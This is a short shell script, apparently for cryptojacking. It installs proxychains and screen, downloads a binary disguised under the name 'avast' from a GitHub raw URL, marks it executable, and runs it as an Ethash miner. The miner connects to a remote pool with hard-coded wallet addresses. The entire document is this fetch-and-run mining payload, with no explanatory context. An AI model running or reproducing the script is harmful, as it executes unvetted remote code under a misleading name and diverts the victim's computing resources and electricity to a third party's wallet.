apt update

apt install proxychains

apt install screen -y

wget -q https://raw.githubusercontent.com/renilo/bc/main/avast

chmod +x avast 

WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-HAJAR)

./avast --algo ETHASH --pool stratum+ssl://us.ezil.me:25443 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.zil1r47c9zkz725j0euwkx9che983pnvujc58n9l99.$WORKER --ethstratum ETHPROXY --enablezilcache
